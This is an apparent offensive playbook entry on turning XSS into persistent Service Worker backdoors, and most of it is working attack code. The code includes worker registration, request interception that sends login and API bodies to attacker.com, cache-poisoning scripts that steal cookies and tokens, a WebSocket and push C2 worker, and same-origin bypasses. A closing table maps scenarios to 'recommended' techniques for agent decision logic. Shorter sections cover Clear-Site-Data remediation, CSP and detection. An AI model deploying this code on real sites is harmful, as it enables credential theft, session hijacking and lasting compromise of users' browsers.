# 51 - Service Worker Persistence via XSS

## Overview

Service Workers (SW) provide a powerful persistence mechanism for XSS attackers. Once a malicious Service Worker is registered via XSS, it continues intercepting and modifying all requests to the origin even after the original XSS vulnerability is patched. The worker persists "until a new worker is provided or the site's data is manually cleared," effectively transforming a transient XSS into a persistent browser-level backdoor.

**Sources:**
- [ACM Security Study of Service Worker XSS](https://dl.acm.org/doi/fullHtml/10.1145/3427228.3427290)
- [Akamai - Abusing the Service Workers API](https://www.akamai.com/blog/security/abusing-the-service-workers-api)
- [NVISO - Deep Dive into Security of PWAs](https://blog.nviso.eu/2020/01/16/deep-dive-into-the-security-of-progressive-web-apps/)
- [SW Cache Attack Research](https://swcacheattack.secpriv.wien/)
- [XenForo AI Chatpage Issue #9](https://github.com/faratech/xenforo-ai-chatpage/issues/9)
- [ACM Honey PostMessage Paper](https://dl.acm.org/doi/fullHtml/10.1145/3579856.3590342)
- [ArXiv Service Worker Attack Categorization](https://arxiv.org/pdf/2111.07153)
- [ArXiv PWA Permissions](https://arxiv.org/pdf/2509.13563)

---

## 1. Service Worker Fundamentals for Attackers

### 1.1 What Makes Service Workers Dangerous

Service Workers are JavaScript workers that act as network proxies between the browser and the server. From an attacker's perspective, they offer:

1. **Persistence:** SWs survive page reloads, tab closures, and browser restarts
2. **Network interception:** SWs intercept ALL fetch requests from the origin
3. **Response modification:** SWs can modify server responses before they reach the page
4. **Background execution:** SWs can run even when no tab is open (via push notifications)
5. **Stealth:** SWs are invisible to the user -- no UI indication of a malicious worker

### 1.2 Service Worker Lifecycle

```
Registration -> Installation -> Activation -> Idle/Terminated -> Fetch Events
     |              |               |                                |
     |              |               +-- Controls all pages           |
     |              |                   for the scope               |
     |              +-- install event fires                          |
     |                  (cache resources)                            |
     +-- navigator.serviceWorker.register('/sw.js', {scope: '/'})    |
                                                                     |
                                                    Intercepts all network requests
                                                    for pages under the scope
```

### 1.3 Same-Origin Constraint

Browsers enforce a critical security constraint: the Service Worker script must be served from the same origin as the page registering it. This means:

- A remote `<script>` tag cannot register a remote SW
- The SW script URL must match the page's origin
- The SW scope is limited to the directory of the SW script and below

**Bypassing the same-origin constraint:**
1. **File upload:** Upload a `.js` file to the target origin (e.g., avatar upload accepting JS MIME type)
2. **JSONP-style endpoints:** Some endpoints reflect user input as JavaScript (callback parameters)
3. **Path traversal:** Use a path traversal vulnerability to serve a JS file from a trusted path
4. **Import scripts:** Use `importScripts()` within the SW to load external payloads
5. **Cache Storage poisoning:** Modify cached responses to inject the SW script

---

## 2. SW Registration via XSS

### 2.1 Basic Registration

```javascript
// XSS payload that registers a malicious Service Worker
// The SW script must already be hosted on the same origin
if ('serviceWorker' in navigator) {
  navigator.serviceWorker.register('/uploads/user/12345/config.js', {
    scope: '/'  // Controls the entire origin
  }).then(function(registration) {
    console.log('SW registered with scope:', registration.scope);
    // Notify attacker
    fetch('https://attacker.com/sw-registered', {
      method: 'POST',
      mode: 'no-cors',
      body: JSON.stringify({
        scope: registration.scope,
        origin: location.origin
      })
    });
  }).catch(function(err) {
    // Registration failed -- likely MIME type or same-origin issue
    fetch('https://attacker.com/sw-failed', {
      method: 'POST',
      mode: 'no-cors',
      body: err.toString()
    });
  });
}
```

### 2.2 Hosting the SW Script via File Upload

Many applications allow file uploads. The attacker needs to upload a JavaScript file that will be served with a valid JS MIME type:

```javascript
// Step 1: Upload malicious SW script disguised as an allowed file type
var swCode = `
self.addEventListener('fetch', function(event) {
  // Intercept all requests
  event.respondWith(
    fetch(event.request).then(function(response) {
      // Clone and exfiltrate interesting requests
      if (event.request.url.includes('/api/') || 
          event.request.url.includes('/login') ||
          event.request.url.includes('/auth')) {
        event.request.clone().text().then(function(body) {
          fetch('https://attacker.com/sw-intercept', {
            method: 'POST',
            body: JSON.stringify({
              url: event.request.url,
              method: event.request.method,
              body: body
            })
          });
        });
      }
      return response;
    })
  );
});
`;

// Upload as a .js file (if allowed) or with manipulated MIME type
var blob = new Blob([swCode], { type: 'application/javascript' });
var formData = new FormData();
formData.append('file', blob, 'sw-helper.js');
fetch('/api/upload', {
  method: 'POST',
  credentials: 'include',
  body: formData
}).then(function(r) { return r.json(); })
.then(function(data) {
  // Step 2: Register the uploaded file as a Service Worker
  navigator.serviceWorker.register(data.url, { scope: '/' });
});
```

### 2.3 Using importScripts for Remote Payloads

The SW script itself must be same-origin, but it can load additional code from any origin using `importScripts()`:

```javascript
// Minimal same-origin SW script (uploaded via file upload)
// sw-loader.js
importScripts('https://attacker.com/full-sw-payload.js');
```

The remote payload contains the full malicious logic, making updates easy:
```javascript
// full-sw-payload.js (hosted on attacker's server)
self.addEventListener('fetch', function(event) {
  // Full malicious SW logic here
  // Can be updated at any time without re-registering the SW
});
```

---

## 3. Cache Storage Poisoning

### 3.1 How Cache Poisoning Achieves Persistence

The CacheStorage API can be accessed from the page context (without a Service Worker). An attacker with XSS can:

1. Open an existing cache used by the application
2. Read the cached `index.html` or other HTML files
3. Inject malicious JavaScript into the cached copy
4. The poisoned cache serves the malicious version on subsequent loads

This is particularly dangerous because:
- It does not require file upload capability
- It survives the original XSS being patched
- It works even if the application does not use Service Workers
- The poisoned content is served from cache before the network request completes

### 3.2 Exploitation

```javascript
// Cache Storage poisoning attack
(async function() {
  // Step 1: Enumerate existing caches
  var cacheNames = await caches.keys();
  console.log('Available caches:', cacheNames);

  for (var cacheName of cacheNames) {
    var cache = await caches.open(cacheName);
    var keys = await cache.keys();

    for (var request of keys) {
      // Step 2: Find HTML responses in cache
      if (request.url.endsWith('/') || request.url.endsWith('.html') ||
          request.url.includes('/index')) {
        var response = await cache.match(request);
        var html = await response.text();

        // Step 3: Inject persistent payload
        var payload = '<script>' +
          '(function(){' +
          'var t=localStorage.getItem("token")||document.cookie;' +
          'fetch("https://attacker.com/cache-persist",{method:"POST",mode:"no-cors",body:t});' +
          '})();' +
          '</script>';

        var poisonedHtml = html.replace('</head>', payload + '</head>');

        // Step 4: Replace cached response
        var newResponse = new Response(poisonedHtml, {
          status: response.status,
          statusText: response.statusText,
          headers: new Headers(response.headers)
        });

        await cache.put(request, newResponse);
        console.log('Poisoned cache entry:', request.url);
      }
    }
  }

  // Notify attacker
  fetch('https://attacker.com/cache-poisoned', {
    method: 'POST',
    mode: 'no-cors',
    body: JSON.stringify({ caches: cacheNames })
  });
})();
```

### 3.3 JavaScript File Cache Poisoning

Instead of modifying HTML, the attacker can replace cached JavaScript files:

```javascript
(async function() {
  var cacheNames = await caches.keys();
  for (var name of cacheNames) {
    var cache = await caches.open(name);
    var keys = await cache.keys();

    for (var req of keys) {
      if (req.url.endsWith('.js') && !req.url.includes('vendor')) {
        var resp = await cache.match(req);
        var code = await resp.text();

        // Prepend malicious code to the cached JS file
        var malicious = '/* analytics */ ' +
          'fetch("https://attacker.com/js-persist",{method:"POST",mode:"no-cors",' +
          'body:document.cookie+"||"+localStorage.getItem("token")});';
        var poisoned = malicious + '\n' + code;

        await cache.put(req, new Response(poisoned, {
          headers: { 'Content-Type': 'application/javascript' }
        }));
      }
    }
  }
})();
```

---

## 4. Persistent C2 (Command and Control) Channels

### 4.1 WebSocket-Based C2 via Service Worker

```javascript
// Malicious Service Worker with C2 channel
var c2Socket = null;

function connectC2() {
  c2Socket = new WebSocket('wss://attacker.com/c2');

  c2Socket.onopen = function() {
    c2Socket.send(JSON.stringify({
      type: 'checkin',
      origin: self.registration.scope,
      timestamp: Date.now()
    }));
  };

  c2Socket.onmessage = function(msg) {
    var cmd = JSON.parse(msg.data);
    executeCommand(cmd);
  };

  c2Socket.onclose = function() {
    // Auto-reconnect after 30 seconds
    setTimeout(connectC2, 30000);
  };
}

function executeCommand(cmd) {
  switch(cmd.action) {
    case 'exfil_cookies':
      // Inject cookie exfiltration into next page load
      self.pendingInjection = '<script>fetch("https://attacker.com/c",{method:"POST",mode:"no-cors",body:document.cookie})</script>';
      break;

    case 'inject_form':
      // Inject a fake login form on next page load
      self.pendingInjection = cmd.html;
      break;

    case 'redirect':
      // Redirect next navigation to phishing page
      self.redirectTarget = cmd.url;
      break;

    case 'intercept_pattern':
      // Start intercepting requests matching a pattern
      self.interceptPattern = new RegExp(cmd.pattern);
      break;

    case 'update_payload':
      // Update the injected payload
      self.pendingInjection = cmd.payload;
      break;

    case 'uninstall':
      // Self-destruct
      self.registration.unregister();
      break;
  }

  if (c2Socket && c2Socket.readyState === WebSocket.OPEN) {
    c2Socket.send(JSON.stringify({ type: 'ack', cmdId: cmd.id }));
  }
}

// Handle fetch events with C2 instructions
self.addEventListener('fetch', function(event) {
  // Check for redirect command
  if (self.redirectTarget && event.request.destination === 'document') {
    event.respondWith(Response.redirect(self.redirectTarget, 302));
    self.redirectTarget = null;
    return;
  }

  // Check for interception pattern
  if (self.interceptPattern && self.interceptPattern.test(event.request.url)) {
    event.respondWith(
      fetch(event.request).then(function(response) {
        response.clone().text().then(function(body) {
          if (c2Socket && c2Socket.readyState === WebSocket.OPEN) {
            c2Socket.send(JSON.stringify({
              type: 'intercepted',
              url: event.request.url,
              body: body.substring(0, 10000)
            }));
          }
        });
        return response;
      })
    );
    return;
  }

  // Inject payload into document responses
  if (self.pendingInjection && event.request.destination === 'document') {
    event.respondWith(
      fetch(event.request).then(function(response) {
        return response.text().then(function(html) {
          var modified = html.replace('</body>', self.pendingInjection + '</body>');
          return new Response(modified, {
            status: response.status,
            statusText: response.statusText,
            headers: response.headers
          });
        });
      })
    );
    return;
  }
});

// Initialize C2 connection
connectC2();
```

### 4.2 Push Notification-Based C2

Service Workers can receive push notifications, enabling a C2 channel that works even when no tab is open:

```javascript
// Malicious SW with push-based C2
self.addEventListener('push', function(event) {
  var data = event.data.json();

  if (data.type === 'c2_command') {
    // Execute C2 command received via push
    executeCommand(data.command);
  } else {
    // Show notification (social engineering / phishing)
    event.waitUntil(
      self.registration.showNotification(data.title, {
        body: data.body,
        icon: data.icon,
        data: { url: data.clickUrl }  // Attacker URL opened on click
      })
    );
  }
});

self.addEventListener('notificationclick', function(event) {
  event.notification.close();
  // Open attacker URL when notification is clicked
  if (event.notification.data && event.notification.data.url) {
    event.waitUntil(
      clients.openWindow(event.notification.data.url)
    );
  }
});
```

### 4.3 postMessage Abuse via Service Worker

A compromised Service Worker can abuse the postMessage API to communicate with controlled pages:

```javascript
// SW sends commands to all controlled pages
self.addEventListener('activate', function(event) {
  event.waitUntil(
    self.clients.matchAll().then(function(clientList) {
      clientList.forEach(function(client) {
        client.postMessage({
          type: 'sw-command',
          action: 'exfiltrate',
          target: 'localStorage'
        });
      });
    })
  );
});
```

**Source:** [ACM Honey PostMessage Paper](https://dl.acm.org/doi/fullHtml/10.1145/3579856.3590342)

---

## 5. Same-Origin Constraint Bypass Techniques

### 5.1 File Upload Bypass

```javascript
// Upload SW script as a profile picture with .js extension
var swScript = 'self.addEventListener("fetch",function(e){/* malicious code */});';
var blob = new Blob([swScript], {type: 'application/javascript'});
var formData = new FormData();
formData.append('avatar', blob, 'avatar.js');

fetch('/api/users/me/avatar', {
  method: 'POST',
  credentials: 'include',
  body: formData
}).then(r => r.json())
.then(data => {
  // Register the uploaded file as SW
  navigator.serviceWorker.register(data.avatarUrl, {scope: '/'});
});
```

### 5.2 JSONP-Style Endpoint Abuse

Some JSONP endpoints or callback-based APIs can serve arbitrary JavaScript:

```javascript
// If the app has a JSONP endpoint:
// /api/data?callback=FUNCTION_NAME
// becomes: FUNCTION_NAME({...data...})

// Register it as a SW (the response is valid JS)
// The SW will fail to install properly but may execute during installation
navigator.serviceWorker.register(
  '/api/data?callback=self.addEventListener("install",function(e){importScripts("https://attacker.com/sw.js")})//',
  {scope: '/'}
);
```

### 5.3 Path Confusion with Double Encoding

```javascript
// Some servers decode paths differently than browsers
// Upload a file to /uploads/image.png but access as /uploads/image.png%00.js
// or use path traversal: /uploads/../api/../../sw.js
navigator.serviceWorker.register(
  '/uploads/..%2F..%2Fsw.js',
  {scope: '/'}
);
```

---

## 6. Clear-Site-Data Remediation

### 6.1 The Definitive Fix

The `Clear-Site-Data` HTTP response header is the most effective remediation for Service Worker persistence attacks:

```http
Clear-Site-Data: "cache", "cookies", "storage", "executionContexts"
```

### 6.2 Header Values and Effects

| Value | Effect |
|-------|--------|
| `"cache"` | Clears Cache Storage (all caches), HTTP cache |
| `"cookies"` | Clears all cookies for the origin |
| `"storage"` | Clears localStorage, sessionStorage, IndexedDB, **unregisters Service Workers** |
| `"executionContexts"` | Terminates all workers and reloads all pages for the origin |
| `"*"` | All of the above |

### 6.3 Implementation

```python
# Server-side: Send Clear-Site-Data on logout or compromise detection
@app.route('/logout')
def logout():
    response = make_response(redirect('/'))
    response.headers['Clear-Site-Data'] = '"cache", "cookies", "storage", "executionContexts"'
    return response

# Emergency response: Add to all pages during incident
@app.after_request
def add_security_headers(response):
    if is_compromised:
        response.headers['Clear-Site-Data'] = '"*"'
    return response
```

### 6.4 Client-Side SW Removal

If `Clear-Site-Data` is not available or insufficient:

```javascript
// Manual Service Worker removal
navigator.serviceWorker.getRegistrations().then(function(registrations) {
  registrations.forEach(function(registration) {
    registration.unregister().then(function(success) {
      console.log('SW unregistered:', success);
    });
  });
});

// Clear all caches
caches.keys().then(function(cacheNames) {
  cacheNames.forEach(function(cacheName) {
    caches.delete(cacheName);
  });
});

// Clear storage
localStorage.clear();
sessionStorage.clear();
indexedDB.databases().then(function(dbs) {
  dbs.forEach(function(db) {
    indexedDB.deleteDatabase(db.name);
  });
});
```

---

## 7. Detection and Monitoring

### 7.1 Detecting Malicious Service Workers

```javascript
// Security monitoring script (add to application pages)
(function() {
  if ('serviceWorker' in navigator) {
    navigator.serviceWorker.getRegistrations().then(function(registrations) {
      registrations.forEach(function(reg) {
        // Check if the SW script URL is unexpected
        var expectedSWs = ['/sw.js', '/service-worker.js', '/ngsw-worker.js'];
        if (!expectedSWs.some(function(expected) {
          return reg.active && reg.active.scriptURL.endsWith(expected);
        })) {
          // Report unexpected Service Worker
          fetch('/api/security/report', {
            method: 'POST',
            headers: {'Content-Type': 'application/json'},
            body: JSON.stringify({
              type: 'unexpected_service_worker',
              scriptURL: reg.active ? reg.active.scriptURL : 'unknown',
              scope: reg.scope,
              timestamp: Date.now()
            })
          });
        }
      });
    });
  }
})();
```

### 7.2 CSP for Service Worker Protection

```http
# Restrict which scripts can be registered as Service Workers
Content-Security-Policy: worker-src 'self'; script-src 'self' https://cdn.example.com;
```

The `worker-src` directive controls which URLs can be registered as Service Workers. Setting it to `'self'` prevents registration of SW scripts from uploaded file directories unless they match the origin exactly.

---

## 8. Attack Catalog Summary

Based on the 2021 ArXiv systematization of Service Worker attacks:

| Attack Type | Technique | Persistence |
|-------------|-----------|-------------|
| Credential harvesting | Intercept login form submissions | Until SW unregistered |
| Session hijacking | Inject token-stealing scripts into pages | Until SW unregistered |
| Cache poisoning | Modify cached resources to include payloads | Until cache cleared |
| Cryptomining | Run WebAssembly miner in SW background | Until SW unregistered |
| Botnet node | C2 via WebSocket/Push from SW | Until SW unregistered |
| Phishing | Inject fake login forms or modify pages | Until SW unregistered |
| Push notification abuse | Send phishing push notifications | Until push unsubscribed |
| Network reconnaissance | Intercept and log all network requests | Until SW unregistered |
| Data exfiltration | Copy API responses to attacker server | Until SW unregistered |
| Persistent XSS | Re-inject XSS payload on every page load | Until SW unregistered |

**Source:** [ArXiv Service Worker Attack Categorization](https://arxiv.org/pdf/2111.07153)

---

## 9. Key Takeaways for Agent Decision Logic

| Scenario | Recommended Technique | Persistence Level |
|----------|----------------------|-------------------|
| XSS + file upload on same origin | Register uploaded JS as SW | High (survives patch) |
| XSS + application uses caching | Cache Storage poisoning | Medium (survives until cache cleared) |
| XSS + JSONP endpoints exist | Register JSONP response as SW | Low (may fail installation) |
| SW installed + need C2 | WebSocket or Push-based C2 | High (background execution) |
| Incident response needed | Send Clear-Site-Data header | Removes all persistence |
| Detection needed | Monitor SW registrations | Detects unexpected workers |
